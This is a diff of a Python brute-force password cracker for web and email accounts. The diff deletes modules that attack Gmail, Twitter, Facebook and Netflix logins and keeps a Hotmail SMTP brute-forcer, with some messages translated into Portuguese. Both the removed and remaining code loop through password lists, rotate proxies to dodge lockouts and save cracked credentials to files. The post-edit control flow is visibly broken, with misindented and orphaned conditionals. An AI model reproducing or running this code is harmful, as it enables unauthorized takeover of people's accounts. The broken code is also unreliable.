@@ -47,22 +47,15 @@ _____________________                              _____________________
                                    \/ 
 {}
 -----------------------------------------------------------------------
--g --gmail                              ACCOUNT gmail @gmail.com
--t --hotmail                            ACCOUNT hotmail @hotmail.com
--T --twitter                            ACCOUNT  twitter @
--f --facebook                           ACCOUNT  facebook @
--n --netflix                            Account  Netflix @
+                                        
+-t --hotmail                            CONTA hotmail @ hotmail.com                     
 -l --list                               List    Password BrutoForce
 -p --password                           Single  Password
 -X --proxy                              Proxy list
                             
 							   """.format(G,R))
 
-use.add_option("-g","--gmail",dest="gmail",help="Write Your Account gmail")
-use.add_option("-t","--hotmail",dest="hotmail",help="Write Your Account hotmail")
-use.add_option("-T","--twitter",dest="twitter",help="Write Your Account twitter")
-use.add_option("-f","--facebook",dest="facebook",help="Write Your Account facebook")
-use.add_option("-n","--netflix",dest="netflix",help="Write Your Account Netflix")
+use.add_option("-t","--hotmail",dest="hotmail",help="Escreva sua conta hotmail")
 use.add_option("-l","--list",dest="list_password",help="Write Your list passowrd")
 use.add_option("-p","--password",dest="password",help="Write Your passowrd ")
 use.add_option("-X","--proxy",dest="proxy",help="Proxy list ")
@@ -95,120 +88,7 @@ def proxy():
         checkProxyIP = brows.open("https://api.ipify.org/?format=raw", timeout=10)
     except:
         return proxy()
-
-def Netflix():
-    password_list = io.open(options.list_password,"r").readlines()
-    try_login = 0
-    print("\r Netflix Account: {}".format(options.netflix))
-    print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
-    for password in password_list:
-        password = password.rstrip('\n')
-        try_login += 1
-        if try_login == 10:
-            try_login = 0
-            proxy()
-        print('\rPassword [==] {} '.format(password).rstrip("\n"))
-        sys.stdout.flush
-        url = "https://www.netflix.com/sa/login"
-        try:
-            brows.open(url, timeout=10)
-            brows.select_form(nr=0)
-            brows.form['userLoginId'] = options.netflix
-            brows.form['password'] = password
-            brows.method = "POST"
-            submit = brows.submit()
-            
-            if 'https://www.netflix.com/browse' in  submit.geturl():
-                print("{}[True][+] Password Found [{}][+]".format(G,password))
-                Save = io.open("Netflix.txt","a").write("Account Netflix:"+options.netflix+"\t\tPassword:"+password+"\n")
-                break
-            else :
-                print("%s[!] False Login Password%s\n"%(R,W))
-        except:
-            print('[!] <<<There are speeches in Communication>>> \n')
-            proxy()
-
-
-
-def facebook():
-    password_list = io.open(options.list_password,"r").readlines()
-    try_login = 0
-    print("\rFacebook Account: {}".format(options.facebook))
-    print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
-    for password in password_list:
-        password = password.rstrip('\n')
-        try_login += 1
-        if try_login == 10:
-            try_login = 0
-            proxy()
-        print('\rPassword [==] {} '.format(password).rstrip("\n"))
-        sys.stdout.flush
-        url = "https://ar-ar.facebook.com/login"
-        try:
-            brows.open(url, timeout=5)
-            brows.select_form(nr=0)
-            brows.form['email'] = options.facebook
-            brows.form['pass'] = password
-            brows.method = "POST"
-            submit = brows.submit()
-            if 'https://www.facebook.com/?sk=welcome' in  submit.geturl():
-                print("{}[True][+] Password Found [{}][+]".format(G,password))
-                Save = io.open("Facebook.txt","a").write("Account Facebook:"+options.facebook+"\t\tPassword:"+password+"\n")
-                break
-            else :
-                print("%s[!] False Login Password%s\n"%(R,W))
-        except:
-            print('[!] <<<There are speeches in Communication>>> \n')
-            proxy()
-
-
-
-def twitter():
-    password_list = io.open(options.list_password,"r").readlines()
-    try_login = 0
-    print("\rTwitter Account: {}".format(options.twitter))
-    print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
-    for password in password_list:
-        password = password.rstrip('\n')
-        try_login += 1
-        if try_login == 10:
-            try_login = 0
-            proxy()
-        print('\rPassword [==] {} '.format(password).rstrip("\n"))
-        sys.stdout.flush
-        url = "https://mobile.twitter.com/login"
-        try:
-            brows.open(url, timeout=5)
-            brows.select_form(nr=0)
-            brows.form['session[username_or_email]'] = options.twitter.strip()
-            brows.form['session[password]'] = password
-            brows.method = "POST"
-            submit = brows.submit()
-            if submit.geturl() == "https://mobile.twitter.com/":
-                print("{}[True][+] Password Found [{}][+]".format(G,password))
-                Save = io.open("Twitter.txt","a").write("Account Twitter:"+options.twitter+"\t\tPassword:"+password+"\n")
-                break
-            elif submit.geturl() == "https://mobile.twitter.com/home":
-                print("{}[True][+] Password Found [{}][+]".format(G,password))
-                Save = io.open("Twitter.txt","a").write("Account Twitter:"+options.twitter+"\t\tPassword:"+password+"\n")
-                break
-            elif 'https://mobile.twitter.com/account/login_challenge' in submit.geturl():
-                    print("{}[True][+] Password Found [{}][+]".format(G,password))
-                    Save = io.open("Twitter.txt","a").write("Account Twitter:"+options.twitter+"\t\tPassword:"+password+"\n")
-                    break
-            elif 'https://mobile.twitter.com/account/locked' in submit.geturl():
-                proxy()
-            else:
-                print("%s[!] False Login Password%s\n"%(R,W))
-        except:
-            print('[!] <<<There are speeches in Communication>>> \n')
-            proxy()
-
-if options.gmail == None  :
-    if options.hotmail == None :
-        if options.twitter == None:
-            if options.facebook == None:
-                if options.netflix == None :
+              if options.hotmail == None :
                     print(use.usage)
                     exit()       
     elif options.hotmail != None or options.gmail == None:
@@ -216,7 +96,7 @@ if options.gmail == None  :
         smtp_srverH.ehlo()
         smtp_srverH.starttls()
         if options.password != None or options.list_password == None  :
-            print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
+            print("%s<<<<<<+++++Comece a atacar e-mail+++++>>>>>%s"%(R,W))
             try :
                 smtp_srverH.login(options.hotmail,options.password)
                 print("Found Password :{} \t Found Hotmail:{}".format(options.password,options.hotmail))
@@ -233,41 +113,9 @@ if options.gmail == None  :
                     Save = io.open("Hotmail.txt","a").write("Account Hotmail:"+options.hotmail+"\t\tPassword:"+password+"\n")
                 except smtplib.SMTPAuthenticationError:
                     print("Not Found Password : {} \t Email Hotmail:{}".format(password,options.hotmail))
-    if options.twitter != None :
-        hejab = threading.Thread(target=twitter,name="hejab")
-        hejab.start()
-    if options.facebook != None :
-        facebook = threading.Thread(target=facebook,name="facebook")
-        facebook.start()
-    if options.netflix != None:
-        netflix = threading.Thread(target=Netflix,name="Netflix")
-        netflix.start()
+  
     
-
-elif options.gmail !=None or  options.hotmail== None or options.twitter==None:  
-    smtp_srverG= smtplib.SMTP('smtp.gmail.com', 587)
-    smtp_srverG.ehlo()
-    smtp_srverG.starttls()
-    if options.password != None or options.list_password == None  :
-        print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
-        try :    
-            smtp_srverG.login(options.gmail,options.password)
-            print("Found Password :{} \t Found Gmail:{}".format(options.password,options.gmail))
-            Save = io.open("Gmail.txt","a").write("Account Gmail:"+options.gmail+"\t\tPassword:"+options.password+"\n")
-        except :
-            print("Not Found Password : {} \t Email Gmail:{}".format(options.password,options.gmail))
-    elif options.list_password !=None:
-        password_list = io.open(options.list_password,"r").readlines()
-        for password in password_list:
-            password = password.rstrip("\n")
-            print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
-            try :    
-                smtp_srverG.login(options.gmail,password)
-                print("{}<<<+++Found Password :{} \t Found Gmail:{}+++>>>".format(G,password,options.gmail))
-                Save = io.open("Gmail.txt","a").write("Account Gmail:"+options.gmail+"\t\tPassword:"+password+"\n")
-                break
-            except smtplib.SMTPAuthenticationError:
-                print("{}<<<---Not Found Password : {} \t Email Gmail:{}--->>>".format(R,password,options.gmail))                       
+                    
 
 else:
     print(use.usage)
